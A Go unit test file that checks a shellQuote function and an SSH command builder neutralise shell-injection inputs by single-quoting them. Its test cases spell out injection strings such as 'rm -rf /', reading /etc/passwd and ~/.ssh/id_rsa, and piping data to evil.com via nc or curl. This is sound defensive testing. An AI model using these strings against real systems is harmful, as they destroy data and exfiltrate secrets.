package exec

import (
	"context"
	"strings"
	"testing"
)

func TestShellQuote_PreventsInjection(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "semicolon injection",
			input:    "file.txt; rm -rf /",
			expected: "'file.txt; rm -rf /'",
		},
		{
			name:     "backtick substitution",
			input:    "`whoami`",
			expected: "'`whoami`'",
		},
		{
			name:     "dollar paren substitution",
			input:    "$(cat /etc/passwd)",
			expected: "'$(cat /etc/passwd)'",
		},
		{
			name:     "pipe injection",
			input:    "data | nc evil.com 1234",
			expected: "'data | nc evil.com 1234'",
		},
		{
			name:     "single quote escape",
			input:    "it's dangerous",
			expected: "'it'\\''s dangerous'",
		},
		{
			name:     "ampersand chaining",
			input:    "safe && curl evil.com",
			expected: "'safe && curl evil.com'",
		},
		{
			name:     "newline injection",
			input:    "arg\nrm -rf /",
			expected: "'arg\nrm -rf /'",
		},
		{
			name:     "variable expansion",
			input:    "$HOME/.ssh/id_rsa",
			expected: "'$HOME/.ssh/id_rsa'",
		},
		{
			name:     "redirect injection",
			input:    "> /tmp/pwned",
			expected: "'> /tmp/pwned'",
		},
		{
			name:     "normal safe input",
			input:    "hello-world",
			expected: "'hello-world'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := shellQuote(tt.input)
			if result != tt.expected {
				t.Errorf("shellQuote(%q) = %q, want %q", tt.input, result, tt.expected)
			}
			// Verify result is always wrapped in single quotes
			if !strings.HasPrefix(result, "'") || !strings.HasSuffix(result, "'") {
				t.Errorf("result should be single-quoted: %q", result)
			}
		})
	}
}

func TestShellQuote_BuildSSHCommand_NoInjection(t *testing.T) {
	// Verify that buildSSHCommand properly quotes arguments
	config := &Config{
		Driver:  "ssh",
		Command: "echo",
		SSH: &SSHConfig{
			Host: "server.example.com",
			User: "deploy",
			Port: 22,
		},
	}
	conn := New("test-ssh-safe", config)

	// Simulate building SSH command with malicious args
	maliciousArgs := []string{
		"; rm -rf /",
		"$(whoami)",
		"`id`",
	}

	ctx := context.Background()
	cmd := conn.buildSSHCommand(ctx, maliciousArgs)
	// The last argument to ssh is the remote command
	remoteCmd := cmd.Args[len(cmd.Args)-1]

	// Each malicious arg should be quoted, not bare
	for _, arg := range maliciousArgs {
		if strings.Contains(remoteCmd, arg) && !strings.Contains(remoteCmd, shellQuote(arg)) {
			t.Errorf("argument %q should be shell-quoted in remote command, got: %s", arg, remoteCmd)
		}
	}

	// Verify the command contains quoted versions
	if !strings.Contains(remoteCmd, "'; rm -rf /'") {
		t.Errorf("expected quoted semicolon injection, got: %s", remoteCmd)
	}
}
